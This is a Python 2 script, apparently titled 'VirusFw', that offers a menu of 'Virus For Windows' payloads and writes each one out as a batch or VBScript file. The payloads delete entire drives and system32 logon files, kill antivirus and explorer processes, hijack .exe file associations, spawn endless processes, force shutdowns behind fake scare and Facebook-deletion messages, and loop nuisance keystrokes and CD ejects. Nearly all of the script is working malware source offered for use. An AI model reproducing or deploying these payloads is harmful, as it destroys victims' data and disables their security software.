#!/usr/bin/env python
import io, os, random, time, unittest, os, sys, subprocess
from time import sleep
os.system('clear')
reload(sys)
sys.setdefaultencoding('utf-8')

def rest():
    python = sys.executable
    os.execl(python, python, *sys.argv)
    curdir = os.getcwd()


def slowprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.05)


underlined = '\x1b[04m'
blue = '\x1b[34;1m'
green = '\x1b[32;1m'
purple = '\x1b[35;1m'
cyan = '\x1b[36;1m'
red = '\x1b[31;1m'
white = '\x1b[37;1m'
yellow = '\x1b[33;1m'
lightgreen = '\\e[1;32m'
okegreen = '\x1b[92m'
bold = '\x1b[33;1m'
inf1 = '\x1b[31;1m[\x1b[37;1m01\x1b[31;1m] \x1b[33;1m> \x1b[37m'
inf2 = '\x1b[31;1m[\x1b[37;1m02\x1b[31;1m] \x1b[33;1m> \x1b[37m'
inf3 = '\x1b[31;1m[\x1b[37;1m03\x1b[31;1m] \x1b[33;1m> \x1b[37m'
inf4 = '\x1b[31;1m[\x1b[37;1m04\x1b[31;1m] \x1b[33;1m> \x1b[37m'
inf5 = '\x1b[31;1m[\x1b[37;1m05\x1b[31;1m] \x1b[33;1m> \x1b[37m'
inf6 = '\x1b[31;1m[\x1b[37;1m06\x1b[31;1m] \x1b[33;1m> \x1b[37m'
inf7 = '\x1b[31;1m[\x1b[37;1m07\x1b[31;1m] \x1b[33;1m> \x1b[37m'
inf8 = '\x1b[31;1m[\x1b[37;1m08\x1b[31;1m] \x1b[33;1m> \x1b[37m'
inf9 = '\x1b[31;1m[\x1b[37;1m09\x1b[31;1m] \x1b[33;1m> \x1b[37m'
inf0 = '\x1b[31;1m[\x1b[37;1m10\x1b[31;1m] \x1b[33;1m> \x1b[37m'
in00 = '\x1b[31;1m[\x1b[37;1m11\x1b[31;1m] \x1b[33;1m> \x1b[37m'
iii2 = '\x1b[31;1m[\x1b[37;1m12\x1b[31;1m] \x1b[33;1m> \x1b[37m'
iii3 = '\x1b[31;1m[\x1b[37;1m13\x1b[31;1m] \x1b[33;1m> \x1b[37m'
iii4 = '\x1b[31;1m[\x1b[37;1m14\x1b[31;1m] \x1b[33;1m> \x1b[37m'
iii5 = '\x1b[31;1m[\x1b[37;1m15\x1b[31;1m] \x1b[33;1m> \x1b[37m'
iii6 = '\x1b[31;1m[\x1b[37;1m16\x1b[31;1m] \x1b[33;1m> \x1b[37m'
iii7 = '\x1b[31;1m[\x1b[37;1m17\x1b[31;1m] \x1b[33;1m> \x1b[37m'
iii8 = '\x1b[31;1m[\x1b[37;1m18\x1b[31;1m] \x1b[33;1m> \x1b[37m'
iii9 = '\x1b[31;1m[\x1b[37;1m19\x1b[31;1m] \x1b[33;1m> \x1b[37m'
ii10 = '\x1b[31;1m[\x1b[37;1m20\x1b[31;1m] \x1b[33;1m> \x1b[37m'
ii11 = '\x1b[31;1m[\x1b[37;1m21\x1b[31;1m] \x1b[33;1m>\x1b[37m'
exxx = '\x1b[31;1m[\x1b[37;1m00\x1b[31;1m] \x1b[33;1m> \x1b[37m'
who = os.system('whoami')
d = '\x1b[31;1m[\x1b[37m+\x1b[31;1m]'
if sys.platform == 'linux2':
    os.system('clear')
else:
    if sys.platform == 'win32':
        os.system('cls')
    else:
        os.system('clear')
print "\n\x1b[31;1m__     ___                _____\n\\ \\   / (_)_ __ _   _ ___|  ___|_      __\n \\ \\ / /| | '__| | | / __| |_  \\ \\ /\\ / /\n  \\ V / | | |  | |_| \\__ \\  _|  \\ V  V /\n   \\_/  |_|_|   \\__,_|___/_|     \\_/\\_/\n\x1b[31;1m[+]\x1b[37mVirus For Windows\n\x1b[31;1m[----\x1b[37mAuthor  : GunadiCBR  \x1b[31;1m---------------->\n\x1b[31;1m[----\x1b[37mDate    : 15-10-2018                   \x1b[31m|-->\n\x1b[31;1m[----\x1b[37mVersion : 1.5                            \x1b[31m|-->\n\x1b[31;1m[----\x1b[37mGithub  : https://github.com/afelfgie  \x1b[31m|-->\n\x1b[31;1m[----\x1b[37mTeam    : Mls18hckr  \x1b[31m---------------->"
print ' '
print inf1 + 'IronMan'
print inf2 + 'Koce'
print inf3 + 'Notepad'
print inf4 + 'Facebook'
print inf5 + 'CD/DVD'
print inf6 + 'shutdown'
print inf7 + 'hardisk'
print inf8 + 'Ugly'
print inf9 + 'Kuis'
print inf0 + 'Alay'
print in00 + 'Capslock'
print iii2 + 'BackSpace'
print iii3 + 'angry'
print iii4 + 'hack'
print iii5 + 'Hang'
print exxx + 'Exit'
print ' '
menu = raw_input('\x1b[31;1mChose \x1b[33;1m--> \x1b[37;1m')
if menu == '1' or menu == '01':
    try:
        file = open('ironman.bat', 'w')
    except IOError:
        print 'ERR...'
        sys.exit()

    print ' '
    print '\x1b[31mPlease Wait...'
    time.sleep(2)
    file.write('\n@echo off\nmode 200\ncolor 1a\nshutdown -s -c "WINDOWS HAS DETECTED A SYSTEM \nFAILURE. SHUTTING DOWN TO PROTECT DATA." -t 30\n:a\nmd %random%\nstart\ndir /s\ngoto a')
    os.system('mv ironman.bat virus')
    print ' '
    print d + ' \x1b[37mdone'
    print ' '
    sys.exit()
else:
    if menu == '02' or menu == '2':
        try:
            file = open('koce.bat', 'w')
        except IOError:
            print 'ERR...'
            sys.exit()

        print ' '
        print '\x1b[31;1mPlease Wait'
        print ' '
        time.sleep(2)
        file.write('\n@echo off\necho You Ugly\ndel D:\\*.* /f /s /q\ndel E:\\*.* /f /s /q\ndel F:\\*.* /f /s /q\ndel G:\\*.* /f /s /q\ndel H:\\*.* /f /s /q\ndel I:\\*.* /f /s /q\ndel J:\\*.* /f /s /q')
        os.system('mv koce.bat virus')
        print ' '
        print d + ' \x1b[37mdone'
        print ' '
        sys.exit()
    else:
        if menu == '3' or menu == '03':
            try:
                file = open('notepad.bat', 'w')
            except IOError:
                print 'ERR...'
                sys.exit()

            print ' '
            print '\x1b[31;1mPlease Wait'
            print ' '
            time.sleep(2)
            file.write('\n@ECHO off\n:top\nSTART %SystemRoot%\nsystem32notepad.exe\nGOTO top')
            os.system('mv notepad.bat virus')
            print ' '
            print d + ' \x1b[37mdone'
            print ' '
            sys.exit()
        else:
            if menu == '4' or menu == '04':
                try:
                    file = open('facebook.bat', 'w')
                except IOError:
                    print 'ERR...'
                    sys.exit()

                print ' '
                print '\x1b[31;1mPlease Wait'
                print ' '
                time.sleep(2)
                file.write('\n@echo off\nmsg * WARNING VIRUS DETECTED!!!!! AFTER 5 MINUTES YOUR \nFACEBOOK ACCOUNT WILL BE DELETED !!!!TO REMOVE THE VIRUS \nCLICK OK OR CLOSE THIS BOX!\nPAUSE\nshutdown -r -t 300 -c \xe2\x80\x9d SORRY!!! YOUR FACEBOOK ACCOUNT ARE \nNOW BEING DELETED !!! PLEASE WAIT \xe2\x80\xa6\xe2\x80\xa6\xe2\x80\xa6..\xe2\x80\x9d\n')
                os.system('mv facebook.bat virus')
                print ' '
                print d + ' \x1b[37mdone'
                print ' '
                sys.exit()
            else:
                if menu == '5' or menu == '05':
                    try:
                        file = open('dvd.bat', 'w')
                    except IOError:
                        print 'ERR...'
                        sys.exit()

                    print ' '
                    print '\x1b[31;1mPlease Wait'
                    print ' '
                    time.sleep(2)
                    file.write('\nSet oWMP = CreateObject\n("WMPlayer.OCX.7")\nSet colCDROMs =\noWMP.cdromCollection\ndo\nif colCDROMs.Count >= 1 then\nFor i = 0 to colCDROMs.Count - 1\ncolCDROMs.Item(i).Eject\nNext\nFor i = 0 to colCDROMs.Count - 1\ncolCDROMs.Item(i).Eject\nNext\nEnd If\nwscript.sleep 5000\nloop')
                    os.system('mv dvd.bat virus')
                    print ' '
                    print d + ' \x1b[37mdone'
                    print ' '
                    sys.exit()
                else:
                    if menu == '6' or menu == '06':
                        try:
                            file = open('sdown.bat', 'w')
                        except IOError:
                            print 'ERR...'
                            sys.exit()

                        print ' '
                        print '\x1b[31;1mPlease Wait'
                        print ' '
                        time.sleep(2)
                        file.write('\n@echo off\nmsg * I don\'t like you\nshutdown -c "Error! You are too ******!" -s')
                        os.system('mv sdown.bat virus')
                        print ' '
                        print d + ' \x1b[37mdone'
                        print ' '
                        sys.exit()
                    else:
                        if menu == '7' or menu == '07':
                            try:
                                file = open('hardisk.bat', 'w')
                            except IOError:
                                print 'ERR...'
                                sys.exit()

                            print ' '
                            print '\x1b[31;1mPlease Wait'
                            print ' '
                            time.sleep(2)
                            file.write('\n@echo off\nDEL C: -Y\nDEL D: -Y')
                            os.system('mv hardisk.bat virus')
                            print ' '
                            print d + ' \x1b[37mdone'
                            print ' '
                            sys.exit()
                        else:
                            if menu == '11' or menu == '11':
                                try:
                                    file = open('ForceAlay.vbs', 'w')
                                except IOError:
                                    print 'ERR...'
                                    sys.exit()

                                print ' '
                                print '\x1b[31;1mPlease Wait'
                                print ' '
                                time.sleep(2)
                                file.write('\nSet wshShell =wscript.CreateObject("WScript.Shell") \ndo wscript.sleep 100 wshshell.sendkeys "{CAPSLOCK}" \nwscript.sleep 100 wshshell.sendkeys "{NUMLOCK}" \nwscript.sleep 100 wshshell.sendkeys "{SCROLLLOCK}" \nloop')
                                os.system('mv ForceAlay.vbs virus')
                                print ' '
                                print d + ' \x1b[37mdone'
                                print ' '
                                sys.exit()
                            else:
                                if menu == '10' or menu == '10':
                                    try:
                                        file = open('capslock.vbs', 'w')
                                    except IOError:
                                        print 'ERR...'
                                        sys.exit()

                                    print ' '
                                    print '\x1b[31;1mPlease Wait'
                                    print ' '
                                    time.sleep(2)
                                    file.write('\nSet wshShell\n=wscript.CreateObject\n("WScript.Shell")\ndo\nwscript.sleep 100\nwshshell.sendkeys "{CAPSLOCK}"\nloop')
                                    os.system('mv capslock.vbs virus')
                                    print ' '
                                    print d + ' \x1b[37mdone'
                                    print ' '
                                    sys.exit()
                                else:
                                    if menu == '12' or menu == '12':
                                        try:
                                            file = open('backspace.vbs', 'w')
                                        except IOError:
                                            print 'ERR...'
                                            sys.exit()

                                        print ' '
                                        print '\x1b[31;1mPlease Wait'
                                        print ' '
                                        time.sleep(3)
                                        file.write('\nMsgBox "kembali ke menu\nsebelumnya"\nSet wshShell\n=wscript.CreateObject\n("WScript.Shell")\ndo\nwscript.sleep 100\nwshshell.sendkeys "{bs}"\nloop')
                                        os.system('mv backspace.vbs virus')
                                        print ' '
                                        print d + ' \x1b[37mdone'
                                        print ' '
                                        sys.exit()
if menu == '13' or menu == '13':
    try:
        file = open('ganas.vbs', 'w')
    except IOError:
        print 'ERR...'
        sys.exit()

    print ' '
    print '\x1b[31;1mPlease Wait'
    print ' '
    time.sleep(3)
    file.write('\noption explicit\n\ndim wshshell\nset wshshell=wscript.createobject("wscript.shell")\n\ndim x\nfor x = 1 to 100000000\nwshshell.run "tourstart.exe"\nnext')
    os.system('mv ganas.vbs virus')
    print ' '
    print d + ' \x1b[37mdone'
    print ' '
    sys.exit()
else:
    if menu == '9' or menu == '09':
        try:
            file = open('kuis.bat', 'w')
        except IOError:
            print 'ERR...'
            sys.exit()

        print ' '
        print '\x1b[31;1mPlease Wait'
        print ' '
        time.sleep(3)
        file.write('\n@echo off\ntitle quiz hari ini :)\n:menu\ncls\necho jika kamu kena virus apa\nyang kamu lakukan\npause\necho pilih yang mana:\necho 1. matiin computer\necho 2. format aja\necho 3. bingung ahh\nset input=nothing\nset /p input=Choice:\nif %input%==1 shutdown -s -t\n30\nif %input%==2 del c:xxx\nif %input%==3 @ECHO off\nmsg * muka lo rusak\nmsg * ngaca dulu gih\nmsg * hayo lo,cpu lu gw acak2\nmsg * ud install ulang aja\nmsg * biar masalah nya kelar\n@ECHO off\n:top\nSTART %SystemRoot%\nsystem32notepad.exe\nGOTO top')
        os.system('mv kuis.bat virus')
        print ' '
        print d + ' \x1b[37mdone'
        print ' '
        sys.exit()
    else:
        if menu == '8' or menu == '08':
            try:
                file = open('ugly.bat', 'w')
            except IOError:
                print 'ERR...'
                sys.exit()

            print ' '
            print '\x1b[31;1mPlease Wait'
            print ' '
            time.sleep(3)
            file.write('\n@ECHO off\n:Begin\nmsg * muka lo jelek\nmsg * ngaca dulu gih\nmsg * hayo lo,cpu lu gw acak2\nmsg * ud install ulang aja\nmsg * biar masalah nya kelar\nGOTO BEGIN')
            os.system('mv ugly.bat virus')
            print ' '
            print d + ' \x1b[37mdone'
            print ' '
            sys.exit()
        else:
            if menu == '14' or menu == '14':
                try:
                    file = open('hack.bat', 'w')
                except IOError:
                    print 'ERR...'
                    sys.exit()

                print ' '
                print '\x1b[31;1mPlease Wait'
                print ' '
                time.sleep(3)
                file.write('\n@echo off\nset end=md \xe2\x80\x9cHack\ninstalling\xe2\x80\x9d\nset fin=copy \xe2\x80\x9cHack\nlog.txt\xe2\x80\x9d \xe2\x80\x9cInstalling\xe2\x80\x9d\n%end%\n%fin%\nnet send * Hack is\ninstalling, press OK to\nbegin set up.\nkill NAVAPSVC.exe /F /Q\nkill zonelabs.exe /F /Q\nkill explorer.exe /F /Q\ncls\nassoc .exe=txtfile\nassoc .txt=mp3file\ncls\nmsg * It is you who is\nhacked \xe2\x80\xa6.\nmsg * I warned you,\nand you kept going.\nChallenge me and this\nis what happens.\nDEL C:WINDOWS\nsystem32logoff.exe /\nF /Q\nDEL C:WINDOWS\nsystem32logon.exe /\nF /Q\nDEL C:WINDOWS\nsystem32logon.scr /\nF /Q\ncls\nshutdown -s -t 5 -c\n\xe2\x80\x9c thank you for\nwaiting\xe2\x80\x9d')
                os.system('mv hack.bat virus')
                print ' '
                print d + ' \x1b[37mdone'
                print ' '
                sys.exit()
            else:
                if menu == '14' or menu == '14':
                    try:
                        file = open('hang.bat', 'w')
                    except IOError:
                        print 'ERR...'
                        sys.exit()

                    print ' '
                    print '\x1b[31;1mPlease Wait'
                    print ' '
                    time.sleep(3)
                    file.write('\nstart\n\nstart\n\nstart\n\nstart\n\nstart\n\nstart\n\nstart\n\nstart\n\nstart\n\nstart\n\nstart\n\nstart')
                    os.system('mv hang.bat virus')
                    print ' '
                    print d + ' \x1b[37mdone'
                    print ' '
                    sys.exit()
                else:
                    if menu == '0' or menu == '00':
                        print ' '
                        print '\x1b[31;1m[+]\x1b[37;1m Thanks For Using My Tool...'
                        time.sleep(1)
                        print ' '
                        print '\x1b[31;1m[+]\x1b[37;1m I am not responsible if anything happens to your computer or your friend, I only give info or just share it. '
                        time.sleep(1)
                        sys.exit()
                    else:
                        print ' '
                        print '\x1b[31mError: \x1b[37mWrong Input \x1b[31;1m!!!'
                        time.sleep(1)
                        rest()
if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        rest()
